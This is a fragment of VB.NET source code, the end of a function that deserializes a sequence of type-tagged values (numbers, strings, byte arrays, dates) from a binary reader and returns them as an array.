            Dim Current As Byte = 0
            Dim Count As Byte = Reader.ReadByte()

            For I As Integer = 0 To Count - 1
                Current = Reader.ReadByte()

                Select Case Current
                    Case 0
                        Items.Add(Reader.ReadBoolean())
                    Case 1
                        Items.Add(Reader.ReadByte())
                    Case 2
                        Items.Add(Reader.ReadBytes(Reader.ReadInt32()))
                    Case 3
                        Items.Add(Reader.ReadChar())
                    Case 4
                        Items.Add(Reader.ReadString().ToCharArray())
                    Case 5
                        Items.Add(Reader.ReadDecimal())
                    Case 6
                        Items.Add(Reader.ReadDouble())
                    Case 7
                        Items.Add(Reader.ReadInt32())
                    Case 8
                        Items.Add(Reader.ReadInt64())
                    Case 9
                        Items.Add(Reader.ReadSByte())
                    Case 10
                        Items.Add(Reader.ReadInt16())
                    Case 11
                        Items.Add(Reader.ReadSingle())
                    Case 12
                        Items.Add(Reader.ReadString())
                    Case 13
                        Items.Add(Reader.ReadUInt32())
                    Case 14
                        Items.Add(Reader.ReadUInt64())
                    Case 15
                        Items.Add(Reader.ReadUInt16())
                    Case 16
                        Items.Add(DateTime.FromBinary(Reader.ReadInt64()))
                End Select
            Next

            Reader.Close()
            Return Items.ToArray()
        End Function
    End Class

End Namespace
